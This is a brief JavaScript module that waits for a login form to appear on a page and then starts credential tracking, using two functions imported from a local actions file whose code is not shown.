import { startWaitingForLoginForm, startTrackingCredentials } from './actions';

function waitForLoginForm() {
  startWaitingForLoginForm(() => {
    startTrackingCredentials();
  });
}

waitForLoginForm();
